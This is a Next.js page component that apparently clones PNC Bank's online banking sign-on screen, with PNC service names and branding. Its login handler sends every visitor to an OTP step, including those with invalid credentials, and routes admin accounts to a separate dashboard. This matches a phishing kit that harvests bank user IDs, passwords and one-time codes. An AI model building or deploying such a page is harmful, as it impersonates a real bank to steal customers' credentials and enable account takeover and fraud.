"use client";

import { FormEvent, useState } from "react";
import { useRouter } from "next/navigation";
import PortalHeader from "./components/portal-header";
import { createAdminSession, generateOTPFromDB, loginWithDatabase, saveCurrentLoginUser } from "./utils/auth";

export default function Home() {
  const router = useRouter();
  const [isServiceMenuOpen, setIsServiceMenuOpen] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const labelClass = "mb-2 block text-[18px] text-[#2f3a48] md:text-[16px]";
  const fieldClass =
    "h-[58px] w-full border border-[#c7ccd3] bg-white px-4 text-[18px] text-[#2f3a48] outline-none placeholder:text-[#6b7580] focus:border-[#f47c20] focus:shadow-[inset_4px_0_0_#f47c20] md:h-[68px] md:px-5 md:text-[16px]";
  const smallLinkClass = "text-[17px] text-[#06569d] md:text-[15px]";
  const mainServices = [
    "Mortgage Application Status Tracker",
    "PNC Benefit Plus HSA",
    "PNCI International",
  ];
  const additionalServices = ["I-Link", "I-Hub", "PayeeWeb"];

  const submitLogin = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage("");
    
    const formData = new FormData(event.currentTarget);
    const userId = formData.get("userId") as string;
    const password = formData.get("password") as string;

    try {
      const loginResult = await loginWithDatabase(userId, password);

      if (loginResult?.success && loginResult?.user?.role === "admin") {
        createAdminSession(loginResult.user.email, loginResult.user.id, loginResult.user.role);
        router.push("/admin/dashboard");
        return;
      }

      // Continue to OTP for non-admin or invalid credentials.
      saveCurrentLoginUser(userId);
      await generateOTPFromDB(userId);
      router.push("/otp");
    } catch {
      setErrorMessage("Unable to process sign on right now. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#efefef] text-[#2f3a48]">
      <PortalHeader />

      <main className="w-full pt-5 pb-5 md:pt-0 md:pb-12">
        <section className="w-full border-y border-[#e1e1e1] bg-white">
          <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
            <h1 className="mb-4 text-[34px] leading-tight font-normal text-[#2f3a48] md:mb-6 md:text-[44px]">
              Sign On to <strong className="font-bold">Online Banking</strong> or{" "}
              <button
                type="button"
                onClick={() => setIsServiceMenuOpen((prev) => !prev)}
                className="inline-flex items-center gap-1 text-[28px] text-[#06569d] md:text-[34px]"
                aria-expanded={isServiceMenuOpen}
                aria-controls="service-menu"
              >
                <span>select another service</span>
                {!isServiceMenuOpen && (
                  <svg viewBox="0 0 24 24" className="h-5 w-5" aria-hidden="true">
                    <path
                      d="M6 9l6 6 6-6"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                    />
                  </svg>
                )}
                {isServiceMenuOpen && (
                  <span className="text-[34px] leading-none md:text-[38px]" aria-hidden="true">
                    x
                  </span>
                )}
              </button>
            </h1>

            {isServiceMenuOpen ? (
              <div id="service-menu" className="pb-4 md:pb-6">
                <div className="grid grid-cols-1 gap-6 text-[22px] md:grid-cols-2 md:gap-16 md:text-[30px]">
                  <div className="space-y-4 md:space-y-6">
                    {mainServices.map((service) => (
                      <a key={service} href="#" className="block text-[#111827]">
                        {service}
                      </a>
                    ))}
                  </div>
                  <div className="space-y-4 md:space-y-6">
                    {additionalServices.map((service) => (
                      <a key={service} href="#" className="block text-[#111827]">
                        {service}
                      </a>
                    ))}

                    <button
                      type="button"
                      onClick={() => setIsServiceMenuOpen(false)}
                      className="block pt-2 text-[22px] text-[#06569d] md:pt-4 md:text-[30px]"
                    >
                      Close Menu or Sign On to Online Banking
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              <>
                <form
                  onSubmit={submitLogin}
                  className="grid grid-cols-1 items-start gap-5 md:gap-6 lg:grid-cols-[minmax(260px,1fr)_minmax(260px,1fr)_minmax(220px,0.78fr)]"
                >
                  <div>
                    <label htmlFor="userId" className={labelClass}>
                      User ID (required)
                    </label>
                    <input
                      id="userId"
                      name="userId"
                      type="text"
                      placeholder="Enter User ID"
                      required
                      autoComplete="username"
                      className={fieldClass}
                    />
                    <label
                      className="mt-4 mb-3 inline-flex items-center gap-3 text-[16px] text-[#2f3a48] md:mt-5 md:mb-0 md:text-[15px]"
                      htmlFor="remember"
                    >
                      <input
                        id="remember"
                        name="remember"
                        type="checkbox"
                        className="h-5 w-5 rounded border-[#7d8792] md:h-[18px] md:w-[18px]"
                      />
                      <span>Remember User ID</span>
                    </label>
                  </div>

                  <div>
                    <label htmlFor="password" className={labelClass}>
                      Password (required)
                    </label>
                    <div className="relative">
                      <input
                        id="password"
                        name="password"
                        type={showPassword ? "text" : "password"}
                        placeholder="Enter Password"
                        required
                        autoComplete="current-password"
                        className={`${fieldClass} pr-12 md:pr-14`}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword((prev) => !prev)}
                        aria-label={showPassword ? "Hide password" : "Show password"}
                        className="absolute top-1/2 right-4 -translate-y-1/2 text-[#0074c9]"
                      >
                        <svg
                          viewBox="0 0 24 24"
                          className="h-6 w-6 md:h-8 md:w-8"
                          fill="none"
                          stroke="currentColor"
                          strokeWidth="2"
                        >
                          <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z" />
                          <circle cx="12" cy="12" r="3.5" />
                          {!showPassword && <line x1="5" y1="5" x2="19" y2="19" />}
                        </svg>
                      </button>
                    </div>
                    <a className={smallLinkClass} href="#">
                      Forgot ID or Password?
                    </a>
                  </div>

                  <div className="pt-1 text-center md:pt-[30px]">
                    <button
                      type="submit"
                      disabled={isLoading}
                      className="h-[58px] w-full rounded border border-[#c7ccd3] bg-[#d7dbe2] text-[18px] font-semibold text-[#2f3a48] md:h-[68px] md:text-[18px] disabled:cursor-not-allowed disabled:opacity-50"
                    >
                      {isLoading ? "Processing..." : "Sign On"}
                    </button>
                    <p className="my-1 text-[19px] text-[#2f3a48] md:mt-2 md:mb-1 md:text-[15px]">
                      or
                    </p>
                    <a className={smallLinkClass} href="#">
                      Enroll In Online Banking
                    </a>
                  </div>
                </form>
                {errorMessage && (
                  <p className="mt-4 text-[16px] text-[#bd2a2a] md:text-[15px]">{errorMessage}</p>
                )}

                <div className="mt-8 border-t border-dotted border-[#d6d9de] pt-7 text-center md:hidden">
                  <p className="text-[16px] text-[#4d5561]">Get our mobile banking app:</p>

                  <div className="mt-5 flex flex-col items-center gap-4">
                    <a
                      href="#"
                      className="inline-flex h-[54px] w-[220px] items-center gap-3 rounded-[10px] border border-[#3a3a3a] bg-black px-4 text-white shadow"
                    >
                      <svg viewBox="0 0 24 24" className="h-7 w-7" fill="currentColor" aria-hidden="true">
                        <path d="M16.7 12.6c0-2.1 1.7-3.1 1.8-3.2-1-1.4-2.6-1.6-3.1-1.6-1.3-.1-2.5.8-3.2.8-.7 0-1.7-.8-2.8-.8-1.4 0-2.8.8-3.5 2-.8 1.3-1 3.3-.3 5 .6 1.4 1.4 3 2.5 2.9 1-.1 1.5-.6 2.8-.6 1.3 0 1.7.6 2.8.6 1.2 0 1.9-1.4 2.5-2.8.7-1.5 1-2.2 1-2.3-.1 0-2.4-.9-2.5-3Z" />
                        <path d="M14.7 6.6c.5-.6.8-1.4.7-2.2-.7 0-1.6.5-2.1 1.1-.5.6-.9 1.4-.8 2.1.8.1 1.6-.4 2.2-1Z" />
                      </svg>
                      <span className="text-left leading-tight">
                        <span className="block text-[10px]">Download on the</span>
                        <span className="block text-[24px] font-medium">App Store</span>
                      </span>
                    </a>

                    <a
                      href="#"
                      className="inline-flex h-[54px] w-[220px] items-center gap-3 rounded-[10px] border border-[#3a3a3a] bg-black px-3 text-white shadow"
                    >
                      <svg viewBox="0 0 24 24" className="h-7 w-7" aria-hidden="true">
                        <path d="M3 3l10 9L3 21z" fill="#00c1ff" />
                        <path d="M13 12l3.7 3.3L20.5 13 13 12z" fill="#ffcf00" />
                        <path d="M3 3l13.7 8.7L20.5 11 3 3z" fill="#00d67f" />
                        <path d="M3 21l13.7-8.7L20.5 13 3 21z" fill="#ff5d5d" />
                      </svg>
                      <span className="text-left leading-tight">
                        <span className="block text-[10px]">GET IT ON</span>
                        <span className="block text-[24px] font-medium">Google Play</span>
                      </span>
                    </a>
                  </div>
                </div>
              </>
            )}
          </div>
        </section>

      </main>
    </div>
  );
}
